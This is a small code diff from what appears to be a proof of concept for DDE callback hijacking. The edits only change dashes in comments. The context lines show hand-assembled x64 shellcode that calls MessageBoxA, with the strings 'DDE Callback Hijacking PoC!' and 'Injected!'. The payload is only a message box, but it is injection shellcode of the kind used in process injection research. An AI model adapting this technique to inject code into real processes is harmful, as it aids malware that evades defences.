@@ -106,18 +106,18 @@ int main() {
         0x4C, 0x8D, 0x05, 0x34, 0x00, 0x00, 0x00, // lea r8, [rip+0x34]  (arg3: caption string)
         0x45, 0x33, 0xC9,                    // xor r9d, r9d          (arg4: MB_OK = 0)
         0xFF, 0x15, 0x07, 0x00, 0x00, 0x00,  // call [rip+0x07]       (calls MessageBoxA)
-        0x33, 0xC0,                           // xor eax, eax          (return NULL — valid for DDE)
+        0x33, 0xC0,                           // xor eax, eax          (return NULL - valid for DDE)
         0x48, 0x83, 0xC4, 0x28,              // add rsp, 0x28
         0xC3,                                 // ret
 
-        // offset 36 — MessageBoxA address, patched at runtime (8 bytes)
+        // offset 36 - MessageBoxA address, patched at runtime (8 bytes)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 
-        // offset 44 — text shown in the MessageBox body (28 bytes including null)
+        // offset 44 - text shown in the MessageBox body (28 bytes including null)
         'D','D','E',' ','C','a','l','l','b','a','c','k',' ',
         'H','i','j','a','c','k','i','n','g',' ','P','o','C','!','\0',
 
-        // offset 72 — title bar text (10 bytes including null)
+        // offset 72 - title bar text (10 bytes including null)
         'I','n','j','e','c','t','e','d','!','\0'
 	};
 
